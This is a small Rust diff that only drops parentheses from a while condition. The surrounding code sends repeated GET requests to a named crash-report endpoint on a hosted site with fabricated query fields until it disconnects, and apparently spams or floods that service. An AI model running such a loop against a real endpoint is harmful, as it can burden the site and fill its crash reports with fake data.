@@ -16,7 +16,7 @@ async fn send_request() {
     let client = Client::new();
     let website = "http://supercraftalex.000webhostapp.com/liquido/crash.php?user=".to_string() + &*replace(pi) + &*"&errs=&exc=&desc=".to_string();
     let mut disconnected = false;
-    while (!disconnected) {
+    while !disconnected {
         let url: Uri = website.parse().unwrap();
         println!("Sent request");
         match client.get(url).await {
